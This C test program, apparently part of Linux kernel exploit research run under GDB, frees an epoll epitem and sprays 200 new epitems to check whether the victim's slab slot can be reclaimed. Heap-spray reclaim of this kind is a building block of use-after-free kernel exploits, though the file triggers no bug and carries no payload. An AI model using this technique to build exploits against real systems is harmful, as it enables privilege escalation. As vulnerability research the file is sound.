/*
 * EXP-007: Same-cache epitem reclaim verification
 *
 * Purpose: Verify that a freed epitem can be reclaimed by a new epitem
 * allocated via epoll_ctl(EPOLL_CTL_ADD), since eventpoll_epi is a
 * dedicated isolated slab cache.
 *
 * Strategy (GDB-orchestrated):
 * 1. Create outer_epoll watching inner_epoll → allocates victim epitem
 * 2. GDB records victim epitem address at __ep_remove entry
 * 3. Close outer_epoll → __ep_remove → kfree_rcu(epi)
 * 4. Wait for RCU grace period
 * 5. Spray 200 new epitems via epoll_ctl(EPOLL_CTL_ADD)
 * 6. GDB checks each new epitem address at ep_insert
 * 7. If any new epitem matches victim address → RECLAIM VERIFIED
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o init test_epoll_spray.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sys/mount.h>
#include <string.h>
#include <errno.h>

#define SPRAY_COUNT 200

int main(void) {
    int outer_epoll, inner_epoll;
    int spray_epolls[SPRAY_COUNT];
    int spray_pipes[SPRAY_COUNT][2];
    struct epoll_event ev;

    /* Mount essential filesystems */
    mount("proc", "/proc", "proc", 0, NULL);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);

    printf("[*] EXP-007: Same-cache epitem reclaim verification\n");

    /* Pre-allocate spray resources */
    for (int i = 0; i < SPRAY_COUNT; i++) {
        spray_epolls[i] = epoll_create1(0);
        if (spray_epolls[i] < 0) {
            perror("epoll_create1 spray");
            return 1;
        }
        if (pipe(spray_pipes[i]) < 0) {
            perror("pipe spray");
            return 1;
        }
    }

    /* Phase 1: Create victim topology */
    outer_epoll = epoll_create1(0);
    inner_epoll = epoll_create1(0);
    ev.events = EPOLLIN;
    ev.data.fd = inner_epoll;
    epoll_ctl(outer_epoll, EPOLL_CTL_ADD, inner_epoll, &ev);
    printf("[*] Topology: outer_epoll(%d) -> inner_epoll(%d)\n", outer_epoll, inner_epoll);

    /* Phase 2: Free the victim epitem */
    printf("[*] Phase 2: Closing outer_epoll to free victim epitem...\n");
    close(outer_epoll);
    printf("[*] outer_epoll closed. epitem freed via kfree_rcu.\n");

    /* Phase 3: Wait for RCU grace period */
    printf("[*] Phase 3: Waiting 500ms for RCU grace period...\n");
    usleep(500000);

    /* Phase 4: Spray new epitems */
    printf("[*] Phase 4: Spraying %d new epitems...\n", SPRAY_COUNT);
    ev.events = EPOLLIN;
    ev.data.u64 = 0xdeadbeefc0de0000ULL;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        ev.data.u64 = 0xdeadbeefc0de0000ULL | i;
        if (epoll_ctl(spray_epolls[i], EPOLL_CTL_ADD, spray_pipes[i][0], &ev) < 0) {
            printf("[!] epoll_ctl spray %d failed: %s\n", i, strerror(errno));
        }
    }
    printf("[*] Spray complete.\n");

    /* Phase 5: Signal GDB that experiment is done */
    printf("[*] Phase 5: Experiment complete. Sleeping for analysis...\n");

    /* Keep process alive for GDB inspection */
    while (1) sleep(3600);
    return 0;
}
